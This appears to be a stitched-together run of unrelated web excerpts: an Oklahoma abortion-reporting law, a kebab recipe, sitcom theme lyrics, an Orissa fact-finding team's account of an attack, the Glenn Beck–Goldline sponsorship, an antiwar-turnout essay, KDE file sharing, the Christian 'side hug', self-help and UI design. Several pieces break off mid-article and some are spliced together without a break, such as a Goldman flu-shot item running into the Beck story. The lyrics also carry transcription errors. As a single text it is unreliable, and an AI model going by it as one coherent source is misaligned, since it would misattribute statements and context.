" To spend a quarter of a million dollars on this is absolutely ridiculous , " Stapleton said , adding , " Oh goodness , all the publicity over this has severely blighted the image of Oklahoma . "
The Centers for Disease Control and Prevention in 1969 drafted criteria for vital statistics around abortion to look at infant and maternal mortality in an effort to make the procedure safer .
The CDC 's guidelines have long been considered the standard and " all the states pretty much follow that , " said Elizabeth Nash , who tracks state abortion legislation for the Guttmacher Institute .
" You compare the law in Oklahoma to the CDC standard , and you see the law in Oklahoma goes far beyond what has been considered appropriate for vital statistics purposes , " Nash said .
The law 's co-sponsor , Lamb , said legislators drafted the measure using portions of a Guttmacher study .
" Some of this was gleaned from the Guttmacher Institute , " he said .
" It 's not Draconian . "
" If we collect this evidence , we can better treat , we can better counsel , we can better provide alternatives , " Lamb said .
Why draft the legislation ?
" I'm pro-life , " he said .
" Oklahoma is a conservative state .
We are a pro-life state , and I believe it 's important public policy to stand on the side of sanctity of life . "
Stapleton , who served in the state House of Representatives from 1986 to 1996 , said the law is another example of the GOP " onslaught " in recent years in Oklahoma , with lawmakers taking aim at abortion .
" They 're trying to do away with abortions completely , " she said .
" They can't because of Roe v. Wade .
But they 're finding ways around Roe v Wade . "
If the law does go forward , the state Department of Health is to have the Web site up and running by March 1 , 2011 .
Doctors are to begin submitting completed questionnaires 30 days later .

There 's something so satisfying about the combination of briny seafood and hearty , juicy meat .
While this marriage — surf and turf — is nothing new , it gets cleverly updated in this simple Summer recipe .
Before being threaded on skewers with thick slices of chorizo , the shrimp is tossed in a bold mixture of garlic , chile powder , and caraway seeds .
Although caraway may seem like an odd pairing with shrimp , it helps marry the flavors of the dish .
Spicy Shrimp and Chorizo Kebabs Adapted from Food & Wine Notes
If you can't find chorizo , substitute with linguica or another spicy , robust sausage .
Ingredients 2 large garlic cloves , thickly sliced
2 teaspoons kosher salt
2 teaspoons caraway seeds
2 tablespoons pure chile powder , such as ancho
1/4 cup neutral oil , such as grapeseed or canola
2 pounds large ( 16/20 ) shrimp , shelled and deveined
5 to 6 fully cooked small chorizo sausages ( about 1/2 pound total ) , sliced 1/2 - inch thick Directions
On a cutting board , using the flat side of a chef 's knife , mash the garlic and salt to a coarse paste .
Add the caraway seeds and finely chop them .
Transfer to a large bowl and stir in the chile powder and oil .
Add the shrimp , and toss to coat .
Meanwhile , bring a large saucepan of water to a boil .
Add the chorizo , and cook over high heat for 5 minutes .
Drain and pat dry .
Let cool slightly .
Tuck a chorizo slice in the crook of a shrimp , and thread it onto a skewer ; the shrimp should be attached at both ends .
Push it to the end of the skewer , and repeat with two more shrimp and chorizo slices .
Using more skewers , repeat with the remaining shrimp and chorizo .
Grill the kebabs over a hot fire , turning once or twice , until charred and the shrimp are cooked through , about 5 minutes .
Serve immediately .

Situation comedy theme songs are n’t what they used to be .
Today , the networks would rather skip the opening montage of characters doing goofy things in order to save time for more commercials .
However , since I Love Lucy , there have been many great themes , and they ’re ingrained in our heads .
But not all of them , even for the best shows , make us want to burst into song .
Here are Gunaxin ’s picks for the best live - action , original themes for situation comedies that are the most fun to sing ( sorry , Friends and Family Guy ) .
Vote for your favorite at the bottom , including for the honorable mentions .
You can also buy many of these , plus more , on Amazon.com .

2 Fresh Prince of Bel - Air
Now , this is a story all about how
My life got flipped - turned upside down
And I liked to take a minute
Just sit right there
I ’ll tell you how I became the prince of a town called Bel Air In west Philadelphia born and raised
On the playground was where I spent most of my days
Chillin ’ out maxin ’ relaxin ’ all cool
And all shootin some b- ball outside of the school
When a couple of guys
Who were up to no good
Startin making trouble in my neighborhood
I got in one little fight and my mom got scared
She said ‘ You ’re movin ’ with your auntie and uncle in Bel Air ’ I begged and pleaded with her day after day
But she packed my suite case and send me on my way
She gave me a kiss and then she gave me my ticket .
I put my walkman on and said , ‘ I might as well kick it ’ .
First class , yo this is bad
Drinking orange juice out of a champagne glass .
Is this what the people of Bel - Air Living like ?
Hmmmmm this might be alright .
But wait I hear there ’re prissy , wine all that
Is Bel - Air the type of place they send this cool cat ?
I do n’t think sow
I ’ll see when I get there
I hope they ’re prepared for the prince of Bel - Air Well , the plane landed and when I came out
There was a dude who looked like a cop standing there with my name out
I ain’t trying to get arrested
I just got here
I sprang with the quickness like lightening , disappeared I whistled for a cab and when it came near
The license plate said fresh and it had dice in the mirror
If anything I can say this cab is rare
But I thought ‘ Now forget it ’ – ‘ Yo homes to Bel Air ’ I pulled up to the house about 7 or 8
And I yelled to the cabbie ‘ Yo homes smell ya later ’
I looked at my kingdom
I was finally there
To sit on my throne as the Prince of Bel Air
1 Gilligan ’s Island
Just sit right back and you ’ll hear a tale ,
A tale of a fateful trip
That started from this tropic port
Aboard this tiny ship .
The mate was a mighty sailing man ,
The skipper brave and sure .
Five passengers set sail that day
For a three hour tour , a three hour tour .
The weather started getting rough ,
The tiny ship was tossed ,
If not for the courage of the fearless crew
The minnow would be lost , the minnow would be lost .
The ship set ground on the shore of this uncharted desert isle
With Gilligan
The Skipper too ,
The millionaire and his wife ,
The movie star
The professor and Mary Ann ,
Here on Gilligans Isle .
So this is the tale of the castaways ,
They ’re here for a long , long time ,
They ’ll have to make the best of things ,
It ’s an uphill climb .
The first mate and the Skipper too ,
Will do their very best ,
To make the others comfortable ,
In the tropic island nest .
No phone , no lights no motor cars ,
Not a single luxury ,
Like Robinson Crusoe ,
As primitive as can be .
So join us here each week my friends ,
You ’re sure to get a smile ,
From seven stranded castaways ,
Here on “ Gilligan ’s Isle . ”

The 20 November , 2009 , firing which left 2 adivasis dead and hundreds injured has triggered tensions in the area .
The team which fled the police and other armed people in Orissa just concluded a press conference at Parvathipuram , Vijayanagaram District , Andhra Pradesh .
The team was in Orissa after receiving disturbing reports of state - sponsored violence , rape , molestations and atrocities against adivasi villagers , and members of the Chasi Mulia Adivasi Sangh .
According to reliable reports , the CMAS , a peaceful , democratic movement fighting for the dignity and rights of adivasis , is being branded extremist by the State in a prelude to unleashing terror on the tribal inhabitants of the area .
Prompting the State ’s violence is the CMAS ’ campaign for land rights and against the liquor - moneylender - mining lobby .
Following the firing of 20 November , 2009 , the conditions in Narayanpatna have been vitiated , with platoons of state police , CRPF and the dreaded Cobra battalions posted in the area .
The routes to the area have been sealed off , and reports filtering out of the area from adivasis speak of atrocities against adivasis .
This bears a striking resemblance to Home Minister P.Chidambaram ’s Operation Greenhunt launched against indigenous people in Chattisgarh to evict them from their lands , and free up the areas for occupation by mining corporations like Tata and Essar .
Below is a narrative of the day ’s happenings as told by Shweta Narayan and Madhumita Dutta over phone :
Even before our visit , we had alerted the District Collector on 8 December 2009 , of our intent to visit and enquire into the situation .
We had sought his assistance in facilitating a meeting with the adivasi leaders of Chasi Mulia Adivasi Sangh imprisoned by the police in the wake of the 20 November , 2009 , firings .
We were particularly interested in meeting one woman leader who was allegedly raped in police custody .
The Collector was told clearly about our intent to visit and our identities .
The team comprised :
1. Sudha Bhardwaj , Advocate , and PUCL - Chhattisgarh
2. Mamata Dash , NFFPFW , Delhi
3. Madhumita Dutta , The Other Media , Chennai
4. Shweta Narayan , The Other Media , Chennai
5. Rumita Kundu , Campaign Against Violence on Women , Bhubaneswar
6. Pramila , Muktigami Mahila Sanghatana , Bhubaneswar
7. Kusum Karnik , NFFPFW , Vidarbha , Maharashtra
8. Ramani , Progress Organisation of Women , Parvathipuram , Andhra Pradesh
9. Durga Jha , Chattisgarh Mahila Adhikar Manch , Chhattisgarh
At 10 a.m. , an All India Women ’s Fact Finding Team consisting of 9 women reached Narayanpatna Police Station and requested to meet the Station In - charge .
We were told that the policeman was busy , and were asked to come in the evening .
The person questioning us asked us for names and mobile phone numbers and names of organisations .
We gave all of that .
We noticed quite a number of uniformed policemen , and many people in plainclothes .
None of the people in uniform ( we assume they were policemen ) had any name tags .
We asked one of them who the people in plainclothes were , and were told that they were all policemen .
We asked the man how many police were there in this area , and he said more than 2000 police .
One striking thing is that none of the many people gathered there were adivasi .
About 20 adivasi men were huddled , squatting inside the police station premises .
We asked the police man near us who they were , and were told that the adivasis were former activists of the Chasi Mulia Adivasi Sangh , who had come to surrender .
This has been happening for a few days now , and many newspapers are reporting this .
By this time , the crowd of so - called plainclothes police were getting restless .
We heard people commenting saying : “ Ab aa rahen hain .
Jab hamarey gaon jal rahe the , tho kahaan the ? ”
( When our farms were being burnt , where were you ?
Now they show up . )
Madhumita felt the situation was looking troublesome , and suggested we leave .
As we were stepping out of the police station , our driver was cordoned off and was being questioned in a very hostile manner and being threatened .
We heard someone saying that he is a regular to these parts , and they enquired as to his antecedents .
We somehow managed to extricate the driver .
One of the policemen in plainclothes , who we saw inside the police station premises , was taking photographs , and he said “ Maaro Inko . ” ( Beat these people up ) .
That is when more than 200 people surged ahead .
The driver was being slapped repeatedly .
Madhu and 75 - year old Kusum Karnik tried to intervene and that is when one man went for Madhu ’s throat .
Kusum was hurt too .
Rumita Kundu was verbally abused inside the police station .
One man crudely said that all these women had come to sleep with the men there .
Mamta
Dash was hit on her back , and abused .
One man attempted to strangle madhu .
When she moved to save herself , her jaw was injured .
All this happened inside the police station premises .
The driver was the one that was being assaulted most , and we did all we could to extricate him and board our vehicle .
By this time , the vehicle was being broken .
The rear windscreen was broken .
With great difficulty , we fled the area driving towards Bandhugaon .
We were followed by the plainclothesmen who claimed to be police on bikes .
Somewhere between Bandhugaon Police Station and the village itself , we were stopped by two men in plainclothes .
They said they were police , and they demanded to see the driver ’s license .
As he was enquiring , about 20 people gathered there .
But nothing untoward happened here .
We were scared nevertheless .
From there , we proceeded to Kottulpetta .
Even before we got to this village , news seemed to have reached them about our visit .
A road blockade had been organised , with a bullock cart blocking the road .
There were no oxen .
The people there , again all non-tribals , pulled out the driver and started assaulting him .
They tried to pull down another male colleague of ours , Mr. Poru Chandra Sahu . and tried to beat them up .
We intervened , and that ’s when Kusum didi , the 75 - year old activist , was hurt on her head .
We were there for more than 15 minutes .
More violence .
More damage to the vehicle .
More slaps for the driver .
Our friends outside had been notified almost as soon as problems began , and phone calls must have been pouring into the Collector and SP ’s office .
By this time , two bikes carrying one of the plainclothes “ policemen ” who had taken our names in Narayanpatna , and another plainclothes guy who was tall and burly , reached there and asked the youth to disperse .
We reached Bondapalli , the border village within Andhra Pradesh .
Almost in no time , a jeep load of Andhra Pradesh police along with plainclothes youth ( young boys ) armed with rifles and bullets arrived on the scene .
They demanded to know who we were .
We were treated more like criminals than victims , and our vehicle was searched .
Only after Madhu spoke to the SP of Vijayanagar , and the DGP were we allowed to go .
The police who stopped us immediately changed the tune , and offered to help us with medical assistance etc .
Our experience with armed youth and police has left us clearly terrified , and convinced that the situation created by the police in Narayanpatna and this part of Orissa is extremely vitiated .
We have the following concerns and demands which we conveyed to the media at a press conference in Parvathipuram , Vijayanagarm District , Andhra Pradesh .
When Medha Patkar , Binayak Sen , Abhay Sahoo called the Collector , Koraput , his first response was that he had no prior information about the team ’s visit and no information of any such incident in the area .
Later , he said he is rushing in a RDO to the spot .
His last version , when the team was trying to flee the area after it was attacked for the third time in police presence , was that the team ’s vehicle was found abandoned near Andhra Border and that there was no one in the vehicle .
He stated the same to Binayak and Medha also .
This was the time when some MPs had called the Collector and Governor and Medha had spoken to the Governor ’s OSD .
So we realised that either he was lying outrightly or he was being deliberately fed wrong information , in anticipation of another brutal attack , by the SP .
Concerns :
1 . The scenario of terror that we witnessed , and were subject to shows the kind of tense situation prevailing in the Narayanpatna area post November 20 , 2009 ’s police firings in Narayanpatna .
2 . There is no access for people to get in and out of the villages in Narayanpatna , with all routes blocked by armed goons .
3 . There is no way to get information about what is happening inside , and no means of verifying the very disturbing accounts we are getting about abuses , molestations and violence against adivasi people .
4 . The number of plainclothesmen who claimed they were police , and the comfort with which people outside the Narayanpatna police station were interacting with the police , and reacting to one policeman ’s instruction to beat us up , suggests that there may be some truth to reports that there is a Salwa Judum style Shanthi Samiti in this area as well .
This may either be sponsored or working in close complicity with the police and state .
4 . If the Fact Finding team of prominent women has been treated with such violence , it is clear that there is absolutely no room for dissent inside the villages .
5 . All the people who attacked us were non-tribals .
Demands :
1 . The officers at the Police Station should be suspended to create an impartial stituation and enable the carrying out of investigations into the firing of 20 November , 2009 , and the subsequent reports of atrocities against tribal people .
2 . The SP Koraput should be suspended .
3 . The Government should constitute a high - level independent investigation team and not depend on the police , who are clearly biased , and are using the language of terror and violence to suppress dissent .

Real Pandemic in the US Economy
In much the same way Goldman and the Wall Street crew have been bailed out financially by the US government , they now also have the rep of getting bailed out of swine flu with early access to the H1N1 shots .
Regular Americans , on the other hand , are still struggling to get flu shots to protect their health .
At least it provides a welcome distraction from the nation ’s real pandemic … becoming unemployed .
“ We used the term ‘ paid spokesman ’ because we felt it was important to tell people that there is a payment going to somebody , ” Mr. Albarian said .
But he said there was a misunderstanding about that designation because Goldline did not specifically pay Mr. Beck on an individual basis to speak on its behalf .
Matthew Hiltzik , a spokesman for Mr. Beck , said the host should never have been listed as a “ paid spokesman ” because he did not receive separate fees beyond the sponsorship for that or any other work he did for the company .
Before he moved onto Fox News , however , Mr. Beck appeared in a video on the Goldline Web site extolling the virtues of gold .
And Mr. Beck routinely reads Goldline ads on the radio , a practice Fox said was acceptable under its guidelines .
Goldline was also listed as the exclusive sponsor of Mr. Beck ’s comedy tour last summer .
Mr. Albarian said the company was represented in advertising signs around the venues during the tour , in the same way that sponsors of any tour would be .
Mr. Beck has also interviewed Mr. Albarian on his radio show , although never on Fox News .
He made a disclosure before a Nov. 12 interview , saying , “ I want you to understand clearly going into this that this is a sponsor of my program . ”
While he said he was aware of the skewering of Mr. Beck by Jon Stewart on “ The Daily Show , ” Mr. Cheatwood said that segment was broadcast after the letter about Mr. Beck ’s association with Goldline had been sent , and had nothing to do with Fox ’s actions .
A controversial amendment to gut a key part of financial overhaul legislation failed on Friday .
The House voted 223-208 against an amendment sponsored by Rep. Walt Minnick ( D - Idaho ) that would have scrapped the proposed Consumer Financial Protection Agency ( CFPA ) .

Minnick favored a council of existing regulators and found support among Republicans , some centrist Democrats and business lobbying interests .
The U.S. Chamber of Commerce scored the amendment .
House Financial Services Committee Chairman Barney Frank ( D - Mass . ) strongly opposed the amendment .
The overall bill is headed for passage later on Friday .
The occasional sign at an antiwar demonstration used to ask , " What if they had a war and nobody came ? "
Unfortunately , right now the question is more like " What do we do when they have an antiwar demonstration and nobody comes ? "
While I can't readily come up with a satisfying answer to that one , I thought it might at least be a useful first step to find out why they 're not coming .
A couple of weekends ago , there was a demonstration against the ongoing wars in Iraq , Afghanistan and Pakistan in San Francisco .
The San Francisco Chronicle put the crowd at 1,000 .
I might have said something more - not over 2,000 , though - and certainly would n't argue with the paper 's headline : " S.F. anti-war march smaller than some hoped for . "
It reported that " by 2 p.m. , the crowd had dwindled to just a few dozen ... when peace activist Daniel Ellsberg , the former military analyst who released the Pentagon Papers during the Vietnam War , took his turn at the microphone " ( a claim whose veracity I cannot judge as , I too had left for another commitment by that point . )
Since more people had turned out to hear Noam Chomsky at a couple of Bay Area appearances the prior weekend than came to the demonstration , the problem obviously was n't lack of interest in the issues it raised .
But as a quoted demonstrator said , " It should be 10 - fold " and that probably was about the size it would have had to be to make people feel really good about it .
I decided I 'd ask - mostly via email - a group of people , whose likelihood of attending the average antiwar march seemed to range from possible to probable , to " give me some idea of what your reasons were for not coming . "
The responses will not be confused with a scientific sampling , to be sure , but I was struck by the breadth of the reasons cited as well as by a certain eagerness in putting them forward .
People seemed to want to talk about why they were n't there .
This appeared to be a question they were asking themselves .
There were , of course , the routine everyday reasons : People did n't hear about it , or at least not soon enough .
Some had to be at the kid 's soccer game or they were in Portland , Oregon , and the like .
Certainly the lack of reach of the publicity on this one did seem particularly pronounced .
San Francisco Assemblyman Tom Ammiano , who came to the rally and ultimately spoke at it , told me he'd only heard about it two days earlier through an email reminder I 'd sent out .
One organizer of the event noted that the two public radio stations most likely to give it advance notice did n't and / or could n't .
( Pacifica station KPFA had been in the midst of an extended on - air fund - raising drive - times are tough there too . )
But some people who cited mundane reasons did n't let it go at that .
One who felt he was " suffocating under a blizzard ' at work , " allowed that it was " not the full story " in that " in the past , I 've made the decision to put things off , " but " in this case , I have to say that I could n't face another dispiritingly underpopulated demo . "
One who'd been out of town for the event noted that " I heard no one say they were going . "
Her sense was " that people have n't quite ramped up to be full out in their critique of Obama , " a theme echoed personally in a reply that " I 'm giving the president the benefit of the doubt " and another expressing the desire " to give Obama a chance .
I 'd hate to see the left do to him what we did to Jimmy Carter ; look who that got us as President ! "
At this point , the only surprising element about the " Obama factor " is how strong it 's stayed for so long .
The diminished enthusiasm for antiwar demonstrations aimed at Obama rather than Bush was obvious last spring , but with about half of the population now leaning against the proposal that the Administration increase Afghanistan troop levels a second time in its first year in office , it seemed that the bloom might be off the Rose Garden , but apparently not so much that you 'd notice in the streets , anyhow .
And , while those of us devoted to stopping the wars he now presides over may cringe at the thought , let 's not forget that Nobel Peace Prize .
There were a few who first hoped that the awarding of the prize might be some subtle Scandinavian shaming exercise - giving the award to someone who really had n't yet done much to promote world peace but , by virtue of his office , had the potential to do so .
But Thorborn Jagland , past prime minister of Norway , has since clarified matters .
According to Jagland , who currently serves as the chairman of the Norwegian Nobel Committee , " we have to look strictly to what Alfred Nobel said in his will - namely , to give the prize to the person who has done the most for peaceful development in the world in the last year .
So we got to the conclusion unanimously that it is President Barack Obama . "
So , absurd as it may be , there are lots of people out there who think that the Administration 's performance over the past year is what peacemaking looks like .
And the idea that a Democratic President must be " strong on defense , " which is to say that he might have to wage wars that his supporters do n't like , is a familiar one anyhow .
The thinking goes that he wo n't be able to fulfill the rest of his agenda if he does n't , presumably a consideration of some importance to a couple of respondents who cited their engagement in other issues like the national health insurance debate and " fighting the cuts to public higher education " as reasons for their not focusing on the ongoing wars .
The very busy leaflet that announced the October 17 San Francisco rally did address concerns such as these in calling for " Money for jobs , pensions , education , healthcare and housing , not wars & corporate bailouts . "
But perhaps the nation 's track record of producing fabulous wealth - for some - while continuing to spend almost as much on its military as the rest of the world combined has made the argument that we can only have " guns or butter " less compelling for some .
Maybe we should engage those who want to " give Obama a chance " on a more fundamental point .
The situation we face today is quite a bit different than during the administrations of either Carter - who almost pulled off the feat of having no one killed in combat on his watch - or Clinton - who did order the bombing of five countries and arguably greased the skids for Bush 's " humanitarian invasion " of Iraq , but engaged in no sustained combat .
We have to go back to the Kennedy / Johnson years to find a Democratic President so heavily involved in military action as Obama is now .

Just as a thought experiment , we might pose to those wanting to give him the benefit of the doubt the question of what we would think if Obama were to actually end our military engagement in Iraq , Afghanistan and Pakistan , but failed to win reelection to a second term as a result .
Would that make him a failure ?
Is it more important that he walk out of the White House having fixed the home mortgage situation than having stopped eight years of killing than has produced little but coffins and enemies for this country and unmeasured death and destruction in the countries where the wars are actually fought ?
Or would n't we consider his one term the most successful stint served by a President in a very , very long time ?
Of course , the more we pose the fundamental questions , the more likely we are to come up against the unpleasant fact that not all of our friends may support our call for immediate withdrawal of US troops from Afghanistan .
For some who may have opposed this war for eight years now , it can be hard to come to grips with the fact that people we traditionally count in the antiwar camp may still be working their way through it .
But , as recent statements of members of Code Pink following their visit to Afghanistan showed , there are , indeed , hardcore antiwar activists whose position is that the US needs to set a withdrawal date and work from there .
While this does not mean that " Out now " activists should change their position , it may suggest a need to engage with proposals that fall short of the ultimate goal .
After all , should we somehow succeed in blocking the troop increase currently under consideration , everything we know about the actual course of the war suggests that the facts on the ground will bring the logic of withdrawal to the fore .
Do they accomplish anything ?
Clearly even those dead - set against the wars are not responding to calls to action .
Some cite fundamental questions as to the ultimate value of demonstrations .
One wrote : " I have to admit , the media blackouts do make me suspect that the mass mobe , however newsy and interesting and it - bleeds - it - leads it was 40 years ago , may have run its course .
I do n't think I 'd argue the point very hard , but it 's been on my mind . "
Another wrote that she " did attend the rally and subsequent march last March .
I would say that I have attended about 75 % of the peace events in San Francisco , including the one before the invasion of Iraq .
I have attended one demonstration in Washington DC , " but " my personal belief is that I continue to go to antiwar events because of the benefit I get from seeing and hearing other groups ' perspectives on peace issues .
I do n't really think that the events have much of an effect on the opinions of folks who do n't already agree with me that the wars should end . "
And there are those who believe that demonstrations like the one on October 17 may actually have a negative impact : " I think it 's politically a very bad idea to publicize one 's weakness .
In my view , that 's a major , although unintended consequence of some of these things . "
For all we know , the demonstration skeptics may be right .
We can certainly see how our failure to thwart the invasion of Iraq with the largest pre-war antiwar demonstrations the world has ever seen will suggest to some that they might just as well work around the garden .
And if our ultimate argument is simply that it 's important to do something rather than nothing , we should n't be afraid to say so .
As one demonstrator the Chronicle quoted said , " People who have been out here year after year , they 're demoralized .
It 's exhausting .
But if I 'm not out here , then I 'm approving of the current policy . "
And there are demonstrations and there are demonstrations - some stayed away because of their sense of what this particular one was all about .
One long - time war opponent explained that he had another commitment at the time of the march , " but I cant say I would have shown up if I was free .
I do n't see any march in SF having much of an impact unless it is both large and broad - based .
I think the two are connected .
When I see a flyer that says ‘ U.S. hands off Iran and North Korea ! ' it does n't exactly inspire me to want to get involved . "
Were there others who would n't come because they were n't comfortable with one or another aspect of the event 's stated goals ?
Hard to say , but there were no shortage of positions to find fault with .
In addition to all of the above mentioned issues , the rally 's flyers argued to " End the siege of Gaza , " for " Self determination for all oppressed nations and peoples , " and to " End war crimes including torture !
Prosecute the criminals ! "
The event 's multiple issues raise a fundamental question of organizing .
Put in mathematical terms , that question is -
When you 're dealing with fractions of the population , do you add or multiply ?
For instance , if one - half of the population opposes the Afghanistan War and one - quarter is concerned with seeing the Israeli Army back off from Gaza , what is the result of combing the issues ?
Do we somehow add the two groups and wind up with more people on our side - potentially as much as three - quarters of the population if the two groups were entirely distinct ?
Or do we wind up multiplying the fractions and end up with support of as little as one - eighth of the population - one - quarter of the one - half who agreed with us on Afghanistan ?
While the goal of all events need not be to appeal to whatever polls tell us is our broadest potential constituency , we probably should at least consider whether we are placing so much on the agenda as to appeal to a vanishingly small sector of the public .
In this case , the numerous slogans might have been more appropriately placed on individual banners at a rally that might have been more massive had it been called around fewer issues .
Finally , there were those who were not comfortable with the groups organizing the demonstration , or at least the groups they thought were organizing it .
One person whose absence I 'd found particularly striking , given his seemingly perfect attendance record at such things , had been delayed by a meeting and arrived after the march had left , but noted that he could n't say he " was inspired by seeing the same old radical sectarian tables " at the rally site .
Another said she " was n't going to go because I do n't like ANSWER demonstrations ( because they have too many topics ) but then I ended up with time on Saturday morning and felt that I 'd like to stand against escalation of troops in Af / Pak . "
A couple of others also cited the fact of the ANSWER Coalition 's organizing the rally as a factor in their non-attendance , either because they thought the group had tried to go it alone and failed to have sufficient reach or because they did n't like the type of event the group generally organizes .
But they were wrong .
As the rally 's emcee told the crowd at one point , the event was actually the product of the combined work of five separate coalitions .
While the slim turnout raises the issue of whether the groups in question are really functioning as meaningful " coalitions , " the inaccuracy of people 's perceptions as to who was behind the demonstrations suggests they may have been looking for reasons not to turn out .
All of which raises one of the most fundamental points of this entire discussion .
This is not the place to debate the merits or demerits of the ANSWER Coalition , United For Peace and Justice , World Ca n't Wait , or any other group .
The simple fact is , however , that they are the ones trying to do something .
As Bay Area newscaster Scoop Nisker used to say , " If you do n't like the news , go out and make some of your own . "
Ain't nobody else going to do it for us .

Meiga , the lightweight and easy to use content sharing software appeared in Fedora updates ( Fedora 11 and 12 ) as of November 30 , 2009 .
Thanks to Enrique , maintainer of Meiga and Thomas , who reviewed and approved Meiga for Fedora .
So , now onwards just use the package manager to install Meiga on Fedora .
Furthermore , Enrique requested to send a patch for adding the SPEC file to the source , so that any user who obtain the source can also easily build the RPMs .
The result is here , and another patch to modify the build script to include this feature is here .
I have also created the DEB package for Ubuntu 9.10 , which is yet to appear in the Meiga website .
Now , in my previous post detailing the necessity which resulted in the discovery and packaging of Meiga , I have mentioned that I could n’t find a very easy Linux - to - Linux file sharing tool ( as easy as you can do in Windows , using Samba ) .
Enter Dolphin .
Since KDE 4.3 , I ’ve been ~exclusively using KDE as the primary desktop environment , and it is awesome .
While wandering through the unknown and unexplored realms of the default file manager in KDE , I came across a handful of very useful features .
Split View :
Within the single window ( rather , single tab ) – two views of folders are possible .
This is very handy when I want to compare and / or copy files from one folder to other .
In - Shell access : Press “ F4 ” from any folder , another view with the terminal will open – now run your favourite rsync command from there and synchronize your personal files .
Fish :
Fish is the protocol to transfer files over SSH ( or RSH ) .
KDE / Dolphin implements and integrates the Fish protocol , which makes to share and / or copy files over the network damn easy .
So , whenever you have two Linux boxes , start sshd ( the OpenSSH daemon ) on the system where files are to be shared , and just point to “ fish://<ip_address_of_host >/ ” in the location bar of Dolphin .
Dolphin will then ask the username / password for the host machine , and once logged in , browse all the files / folders the user has access to .
GNOME / Nautilus users can use the “ sftp : // ” protocol for the same effect .
A form of greeting promoted by some Christian groups in which two parties hug by wrapping one arm around the shoulder of the other person , as if posing for a photo , rather than the traditional " front hug , " or wrapping both arms around the shoulders or waist from the front .
The motivation behind the side hug is that frontal hugs allow the two parties ' crotches to touch , apparently emulating sexual activity .
While the Christian side hug has been promoted for a few decades , it came to the attention of the Internet with a much - ridiculed Youtube video posted in November 2009 , in which a Christian rap group attending the 2009 Encounter Generation Conference , a Christian youth conference , performed a rap song explaining the merits of the side hug .
The video 's unintentionally humorous message , lyrics , and the behavior of the performers ( including mock gunfire and police sirens contradicting the Christian message of the song ) made it an Internet sensation , much to the embarrassment of Christians .
Debate ensued over how serious the song was intended to be .
The writer and lead singer explained that the song was meant to parody overly protective Christian ideas .
However , both the lyrics and the EG Conference 's website clearly state that anyone caught " front hugging " will be removed from the event , calling this claim into question .
Regardless , the video has already become extremely popular on Youtube and has spawned several spoofs .
Your journey to Far Beyond The Stars has begun .
You are both the dreamer and the dream .
What are the cornerstones you build your life upon ?

HEALTH
Health is the first cornerstone for designing a life that goes far beyond the stars .
Think about it :
You can enjoy a sunset , delicious desert or meditative state just as much as Bill Gates or Warren Buffett .
Yet nothing will impinge on your time and attention plus your ability to learn and accomplish things as much as poor health .
Consequently , health in all its facets , physical , mental , emotional and spiritual , is the first cornerstone for being able to design your life .
WEALTH
Wealth is the next cornerstone for building a life to go far beyond the stars .
One tool for financial independence is passive income is highly sought after and often misunderstood .
Passive income streams usually require significant investment and nurturing in the beginning .
But with diligence , creativity , efficiency and persistance these passive income streams begin to build and maintain themselves .
An example is Bitcoin Mining or other cryptocurrencies where you can learn more at We Use Coins .
Successfully cultivated passive income streams enables you to free up your time and attention to be used on awesome experiences and deep fulfilling relationships .
EXPERIENCES
Once health and wealth are under control and serving your higher self then comes the opportunity for self development and personal realization .
This is where optimized human experiences come into play .
Traveling , learning languages or instruments , playing sports or dancing , meditating and studying are all ways you can enter flow and have awesome experiences .
RELATIONSHIPS
The most complex and most fulfilling human experiences come from human relationships .
After all , it is not where you go but who you go with .
Consequently , once you have your health , wealth and experiences under control and serving yourself then you can find others to join you in living an optimized human experience and journeying far beyond the stars .
Alternate Versions
The 1985 " Fears , Worries , and Anxieties " episode had to be modified in one scene .
The scene had Alasdair , Mom , and Dad talking about a bully at school called " Killer Curtis " .
When it was discovered that there actually WAS a murderer named Killer Curtis in the U.S. , they decided that the bully 's name should be changed , so the words " killer Curtis " were changed to " Crusher Willis " .
This was done very badly because between the time that the episode was shot , and when they made the recording , Alasdair 's voice had changed .

The underlying secret to beautiful user interface design is realism : making 2D objects on your screen appear to sit in 3D space with volume , surface properties and undulations that might appear in real life .
These faux 3D objects have highlights and shadows just like objects on your desk might have , and they have textures that emulate real objects from glass to sandpaper and everything in between .
Designing beautiful user interfaces has more to do with the why than the how .
Thinking in 3D
If you 're trying to design a realistic - looking user interface element then you have to think about what that object would look like in the real world .
What 's the easiest way to do that ?
Look at it from the side .
What would a button look like if you viewed it from the side of your monitor ?
Let 's take a look .
Here 's a button - shaped panel that 's designed to look slightly raised and have a matte surface .
It 's thin , has a subtle convex shape , and has a small edge that goes around the outside .
In a 3D space , the light source would illuminate the edges ( slightly brighter on the topmost edge ) and would not fully illuminate the bottom slope of the panel past the apex .
The object would cast a small shadow since it's not raised off the surface very much .
Pastebot , the new app from Tapbots , has a table view filled with panels that look similar to the one from above .
Let 's see what it'd look like with multiple panels next to each other .
This looks like a realistic series of panels because of the Top Edge Highlight up against the Inset Shadow which , from the side , would look like this : <. The Inset Shadow appears because the light source does not illuminate that area but then the next panel starts and pokes out , catching the light and showing a highlight .
Design elements that we think look great are usually the ones that look the most realistic , as if they could be in front of us on our desk or on the wall .
Paying close attention to how light would strike the object as if it were real is crucial to executing a realistic user interface element .
Designing The Material & Surface
In my internet globe icon tutorial I stressed the impact an object 's material has on its overall look .
Not accustomed to thinking about an object 's material ?
Get used to it !
It adds a new dimension to your design and keeps the object 's realism in the front of your mind .
If you 're designing an interface element and can't immediately name what type of material you 're emulating then how can you execute it with perfect realism ?
I recently linked to some beautiful Dock replacements for your Mac and many of these illustrate how important the material is to your overall design .
In one named Phantom the designer uses two different materials to make the Dock : a textured , grainy surface coupled with a semi- transparent glass edge .
The textured surface seems like the back of a notebook pad or a heavily - used wallet whereas the front edge looks like a clear , solid block of lucite .
Apple has been using shiny , gloss - laden user interface elements in Mac OS X for awhile but recently there has been some chatter that they were gearing up for a total interface refresh using matte elements .
This full refresh never happened but matte interface elements have been steadily making their way into Mac OS X for a number of years .
With the latest version of iTunes , many user interface elements like scrollbar sliders and buttons have been given the updated , matte look .
Apple 's also been using the matte look in some of their Pro software , most notably Final Cut Server .
In that application 's interface , Apple 's removed the gloss from nearly everything and kept convex buttons close to flat with only a slight highlight on the edge .
Also , the icons on buttons are not set into the button ( accomplished via a thin , white drop shadow on the bottom , a style used throughout Mac OS X ) but instead sit on top of the button through the use of a dark drop shadow on the icon .
The entire interface pane is slightly raised and looks like dark , textured steel , making the application look like the instrument panel to a high - tech piece of equipment .
Here 's an assortment of icons that all show how different surface materials contribute to the overall look of the element :
